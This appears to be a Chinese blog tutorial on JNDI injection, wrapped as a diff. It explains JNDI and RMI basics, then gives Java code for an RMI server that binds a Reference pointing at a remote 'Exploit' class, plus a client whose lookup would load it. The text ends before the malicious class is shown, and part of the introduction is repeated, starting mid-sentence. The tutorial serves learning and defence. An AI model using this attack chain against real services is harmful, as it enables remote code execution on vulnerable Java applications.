@@ -1,0 +1,306 @@
+<!doctype html>
+<html lang="en">
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+    <meta name="theme-color" content= #93b658 >
+    <title>浅谈JNDI注入 | ebandeng </title>
+
+    
+        <meta name="keywords" content=","/>
+        
+
+    
+    <meta name="description" content="1 JNDI概述JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户..."/>
+
+    
+
+    
+
+    
+
+    
+        
+<link rel="stylesheet" href="/lib/social-share.js/dist/css/share.min.css">
+
+    
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/materialize/dist/css/materialize.min.css">
+
+    
+<link rel="stylesheet" href="/lib/animate.css/animate.min.css">
+
+    
+<link rel="stylesheet" href="/css/post/atom-one-light.css">
+
+    
+<link rel="stylesheet" href="/css/pteris.css">
+
+
+
+    
+        
+<link rel="stylesheet" href="/css/post.css">
+
+    
+
+    
+        
+<link rel="stylesheet" href="/lib/lightgallery.js/dist/css/lightgallery.min.css">
+
+    
+
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+
+<header>
+    
+        <div class="header-fixed">
+    <nav class="white lime-text lighten-1 " role="navigation">
+        <div class="nav-wrapper container">
+            <div id="logo-container">
+                <a href="/">
+                    
+                    <span class="brand-logo">ebandeng</span>
+                </a>
+            </div>
+
+            <ul class="right hide-on-med-and-down">
+                
+            </ul>
+            <a href="#" data-activates="nav-mobile" class="button-collapse">
+                <i class="fa fa-bars green-text"></i></a>
+        </div>
+    </nav>
+</div>
+
+<ul id="nav-mobile" class="side-nav">
+    
+</ul>
+
+
+
+    
+</header>
+
+<main>
+    
+
+    <div id="post">
+        <div class="container">
+            <div id="post-header" class="center">
+                <h1 class="center">浅谈JNDI注入</h1>
+                <span class="post-date center">
+                    <i class="fa fa-calendar"></i>
+                    <time datetime="2023-07-28T09:23:18.000Z">
+                        2023-07-28
+                    </time>
+                </span>
+
+                
+
+                
+                    <div class="post-gallery">
+                        <div id="lightgallery">
+                            
+                        </div>
+                    </div>
+                
+            </div>
+
+            <article>
+                <div class="content">
+                    
+    <h2 id="1-JNDI"><a href="#1-JNDI" class="headerlink" title="1 JNDI"></a>1 JNDI</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>JNDI(Java Naming and Directory Interface,Java命名和目录接口)是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
+<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
+<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
+<p>简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
+<h3 id="JNDI结构"><a href="#JNDI结构" class="headerlink" title="JNDI结构"></a>JNDI结构</h3><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2 前置知识"></a>2 前置知识</h2><p><strong>RMI介绍</strong></p>
+<p>　　远程方法调用（RMI）顾名思义是一台机器上的程序调用另一台机器上的方法。这样可以大致知道RMI是用来干什么的，但是这种理解还不太确切。RMI是Java支撑分布式系统的基石，例如著名的EJB组件。RMI是远程过程调用（RPC）的一种面向对象实现，RMI底层是通过socket通信和对象序列化技术来实现的。</p>
+<p><strong>RMI基本原理</strong></p>
+<p>　　RMI的目的就是要使运行在不同的计算机中的对象之间的调用表现得像本地调用一样。RMI 应用程序通常包括两个独立的程序:服务器程序和客户机程序。RMI 需要将行为的定义与行为的实现分别定义, 并允许将行为定义代码与行为实现代码存放并运行在不同的 JVM 上。在 RMI 中, 远程服务的定义是存放在继承了 Remote 的接口中。远程服务的实现代码存放在实现该定义接口的类中。RMI 支持两个类实现一个相同的远程服务接口: 一个类实现行为并运行在服务器上, 而另一个类作为一个远程服务的代理运行在客户机上。客户程序发出关于代理对象的调用方法, RMI 将该调用请求发送到远程 JVM 上, 并且进一步发送到实现的方法中。实现方法将结果发送给代理, 再通过代理将结果返回给调用者。</p>
+<p>通俗的来说，RMI就是能让我们去调用远程服务器上面的对象和方法、即使本地不存在该类。</p>
+<p><strong>RMI应用示例</strong></p>
+<p>代码实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">java</span>.rmi.Remote&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.log4j2.test.Hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="comment">// 构造方法需要声明抛出RemoteException异常</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现Hello接口的方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="comment">// 在服务器端输出一条消息，表示收到客户端的调用请求</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Hello from &quot;</span> + from + <span class="string">&quot;!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回一个字符串作为示例</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;sayHello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>服务端类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.example.log4j2.test.impl.HelloImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException &#123;</span><br><span class="line">        <span class="comment">// 创建RMI注册表，监听在端口1099</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置JNDI的属性，指定RMI注册表的地址</span></span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建初始上下文对象</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将HelloImpl对象绑定到JNDI命名空间中，名字为&quot;hello&quot;</span></span><br><span class="line">        <span class="comment">// 客户端通过该名字查找到HelloImpl对象并进行远程调用</span></span><br><span class="line">        context.bind(<span class="string">&quot;hello&quot;</span>, <span class="keyword">new</span> <span class="title class_">HelloImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭上下文对象</span></span><br><span class="line">        context.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>客户端类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.log4j2.test.Client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.log4j2.test.Hello;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="comment">// 设置RMI注册表的连接信息</span></span><br><span class="line">        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line">        System.setProperty(Context.PROVIDER_URL, <span class="string">&quot;rmi://localhost:1099&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建InitialContext对象，用于查找RMI注册表并获取远程对象引用</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过查找RMI注册表，获取远程对象的引用</span></span><br><span class="line">        <span class="type">Hello</span> <span class="variable">rmiObject</span> <span class="operator">=</span> (Hello) context.lookup(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用远程对象的方法，传入参数&quot;world&quot;，并接收返回值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> rmiObject.sayHello(<span class="string">&quot;world&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在客户端输出远程对象方法的返回结果</span></span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭InitialContext对象</span></span><br><span class="line">        context.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先运行<code>HelloServer</code>，再运行<code>HelloClient</code>，即可看到运行输出的结果：<code>sayHello</code>。</p>
+<p><code>HelloServer</code>将<code>HelloImpl</code>对象绑定到<code>hello</code>名称上。<code>HelloClient</code>使用<code>hello</code>名称，即可获取<code>HelloImpl</code>对象。</p>
+<p>端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>
+<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，类似JDBC都是构建在抽象层上。现在JNDI已经成为J2EE的标准之一，所有的J2EE容器都必须提供一个JNDI的服务。</p>
+<p>JNDI可访问的现有的目录及服务有：<br>DNS、XNam 、Novell目录服务、LDAP(Lightweight Directory Access Protocol轻型目录访问协议)、 CORBA对象服务、文件系统、Windows XP&#x2F;2000&#x2F;NT&#x2F;Me&#x2F;9x的注册表、RMI、DSML v1&amp;v2、NIS。</p>
+<p>以上是一段百度wiki的描述。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。从网上文章里面查询到该作用是可以实现动态加载数据库配置文件，从而保持数据库代码不变动等。</p>
+<h3 id="JNDI结构-1"><a href="#JNDI结构-1" class="headerlink" title="JNDI结构"></a>JNDI结构</h3><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class="line"></span><br><span class="line">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</span><br><span class="line"></span><br><span class="line">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class="line"></span><br><span class="line">javax.naming.ldap：提供LDAP支持；</span><br><span class="line"></span><br><span class="line">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-前置知识-1"><a href="#2-前置知识-1" class="headerlink" title="2 前置知识"></a>2 前置知识</h2><p>其实在面对一些比较新的知识的时候，个人会去记录一些新接触到的东西，例如类的作用。因为在看其他大佬写的文章上有些在一些前置需要的知识里面没有去叙述太多，需要自己去查找。对于刚刚接触到的人来说，还需要去翻阅资料。虽然说在网上都能查到，但是还是会有很多搜索的知识点，需要一个个去进行查找。所以在之类就将一些需要用到的知识点给记录到这里面。方便理解，也方便自己去进行翻看。</p>
+<h3 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h3><h4 id="构造方法："><a href="#构造方法：" class="headerlink" title="构造方法："></a>构造方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">InitialContext() </span><br><span class="line">构建一个初始上下文。  </span><br><span class="line">InitialContext(<span class="type">boolean</span> abd) </span><br><span class="line">构造一个初始上下文，并选择不初始化它。  </span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br><span class="line">使用提供的环境构建初始上下文。 </span><br></pre></td></tr></table></figure>
+
+<p>代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br></pre></td></tr></table></figure>
+
+<p>在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</p>
+<h4 id="常用方法："><a href="#常用方法：" class="headerlink" title="常用方法："></a>常用方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bind(Name name, Object obj) </span><br><span class="line">	将名称绑定到对象。 </span><br><span class="line">list(String name) </span><br><span class="line">	枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">lookup(String name) </span><br><span class="line">	检索命名对象。 </span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">	将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class="line">unbind(String name) </span><br><span class="line">	取消绑定命名对象。 </span><br></pre></td></tr></table></figure>
+
+<p>代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/exp&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h3><p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名&#x2F;目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
+<h4 id="构造方法：-1"><a href="#构造方法：-1" class="headerlink" title="构造方法："></a>构造方法：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Reference(String className) </span><br><span class="line">	为类名为“className”的对象构造一个新的引用。  </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">	为类名为“className”的对象和地址构造一个新引用。  </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line">	为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation) </span><br><span class="line">	为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br></pre></td></tr></table></figure>
+
+<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
+<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
+<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
+<h2 id="3-JNDI注入攻击"><a href="#3-JNDI注入攻击" class="headerlink" title="3 JNDI注入攻击"></a>3 JNDI注入攻击</h2><p>在叙述JNDI注入前先来看一段源码。</p>
+<h4 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a>代码示例：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.rmi.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="string">&quot;rmi://127.0.0.1:1099/exploit&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//得到初始目录环境的一个引用</span></span><br><span class="line">        initialContext.lookup(uri);<span class="comment">//获取指定的远程对象</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在上面的<code>InitialContext.lookup(uri)</code>的这里，如果说URI可控，那么客户端就可能会被攻击。JNDI可以使用RMI、LDAP来访问目标服务。在实际运用中也会使用到JNDI注入配合RMI等方式实现攻击。</p>
+<h3 id="JNDI注入-RMI实现攻击"><a href="#JNDI注入-RMI实现攻击" class="headerlink" title="JNDI注入+RMI实现攻击"></a>JNDI注入+RMI实现攻击</h3><p>下面还是来看几段代码，来做一个分析具体的攻击流程。</p>
+<h4 id="RMIServer代码："><a href="#RMIServer代码：" class="headerlink" title="RMIServer代码："></a>RMIServer代码：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.log4j2.JNDIRMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIserver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="comment">// 设置一个虚假的URL，实际上并不会被使用它只是作为一个占位符存在，用于创建Reference对象。</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8088/&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建RMI注册表，并监听在默认端口号1099</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// 创建一个Reference对象，用于存储远程对象的引用信息</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Exploit&quot;</span>, <span class="string">&quot;Exploit&quot;</span>, url);</span><br><span class="line">        <span class="comment">// 创建一个ReferenceWrapper对象，将Reference对象封装成Wrapper对象</span></span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        <span class="comment">// 将ReferenceWrapper对象绑定到RMI注册表中，使用名字&quot;exp&quot;</span></span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, referenceWrapper);</span><br><span class="line">        <span class="comment">// 输出提示信息</span></span><br><span class="line">        System.out.println(<span class="string">&quot;running&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="RMIClient代码："><a href="#RMIClient代码：" class="headerlink" title="RMIClient代码："></a>RMIClient代码：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.log4j2.JNDIRMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/exp&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建一个初始上下文对象</span></span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">// 通过RMI URL &quot;rmi://localhost:1099/exp&quot; 在RMI注册表中查找对应的远程对象</span></span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意类，挂载在web页面上让server端去请求。</p>
